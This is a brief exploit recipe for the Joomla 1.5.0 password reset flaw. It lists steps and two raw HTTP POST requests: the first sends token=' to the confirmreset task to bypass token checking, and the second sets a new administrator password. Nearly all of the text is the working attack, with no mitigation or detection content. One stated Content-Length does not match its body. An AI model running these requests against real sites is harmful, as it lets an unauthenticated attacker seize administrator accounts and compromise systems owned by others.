## Use case

The vulnerable password reset flow in Joomla 1.5.0 allows an unauthenticated attacker to reset the administrator's password due to a flaw in token validation, which can lead to full system compromise.

## Steps to test

1. Enumerate subdomains of the target to identify the Joomla version.
2. Confirm the version is Joomla 1.5.0 by accessing the admin panel or relevant endpoints.
3. Send a POST request to index.php?option=com_user&task=confirmreset with token=' to trigger the reset flow.
4. Send a POST request to index.php?option=com_user&task=completereset with a new password to change the admin password.

## Commands

```text
POST /index.php?option=com_user&task=confirmreset HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

token='
POST /index.php?option=com_user&task=completereset HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

new_password=YourNewPassword
```
